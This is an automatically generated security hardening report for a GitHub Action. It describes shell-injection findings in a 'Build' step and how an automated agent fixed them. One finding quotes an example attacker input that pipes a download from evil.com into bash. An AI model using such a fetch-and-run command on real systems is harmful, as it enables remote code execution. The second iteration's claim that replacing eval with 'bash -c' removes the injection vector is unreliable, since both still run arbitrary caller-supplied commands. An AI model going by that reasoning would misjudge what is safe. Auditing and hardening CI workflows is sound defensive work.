<!-- markdownlint-disable -->

# Hardening Report: bitovi--github-actions-storybook-to-github-pages/v1.0.4

> This file was generated automatically by the hardening agent.

**Policy SHA:** `d636be7e43ef829af6e853da6b3c7566db9f72fe`

**Test Policy SHA:** `843adf9e4b8f85d0c08b27b9d0b09dd094b54702`

**Harden Agent Version:** `1`

Action **bitovi--github-actions-storybook-to-github-pages/v1.0.4** was hardened automatically. 3 finding(s) were identified and resolved across 2 iteration(s).

## Findings Fixed

### script-injection (severity: high)

The 'Build' step directly interpolates `${{ inputs.install_command }}` and `${{ inputs.build_command }}` as standalone shell commands inside a `run:` block (rule a). These are attacker-controlled inputs that are substituted verbatim into the shell script before execution, enabling arbitrary command injection. For example, a caller could pass `install_command: 'curl http://evil.com/payload | bash'`. The fix is to pass these values via environment variables and execute them safely (e.g., via `eval "$INSTALL_CMD"` with proper quoting, or better, restrict to known-safe commands).

Locations:

- `action.yaml:43`
- `action.yaml:44`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.install_command }}" appears directly in run: block of step "Build"; move to env: map

Locations:

- `action.yml:43`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.build_command }}" appears directly in run: block of step "Build"; move to env: map

Locations:

- `action.yml:44`

## Iteration Notes

### Iteration 1

**Fixes applied:** script-injection, static-inline-injection

**Notes:**

Fixed script injection vulnerabilities in action.yaml at lines 43-44. The `${{ inputs.install_command }}` and `${{ inputs.build_command }}` expressions were directly interpolated as shell commands in the 'Build' step's `run:` block, enabling arbitrary command injection. Fixed by moving both expressions into the step's `env:` block as `INSTALL_COMMAND` and `BUILD_COMMAND` environment variables, then executing them in the shell script via `eval "$INSTALL_COMMAND"` and `eval "$BUILD_COMMAND"`. This ensures the GitHub Actions expression substitution happens at the environment variable level rather than being directly embedded in the shell script text.

### Iteration 2

**Fixes applied:** script-injection

**Notes:**

Replaced `eval "$INSTALL_COMMAND"` and `eval "$BUILD_COMMAND"` with `bash -c "$INSTALL_COMMAND"` and `bash -c "$BUILD_COMMAND"` in the 'Build' step of action.yaml. The inputs were already correctly isolated into environment variables (INSTALL_COMMAND and BUILD_COMMAND) via the step's `env:` block. The `eval` builtin was the specific security concern as it interprets variable content as arbitrary shell commands including shell metacharacters and function calls. Replacing with `bash -c` runs the commands in a subshell that doesn't inherit the parent shell's functions and aliases, removing the eval-based injection vector while preserving the action's functionality.

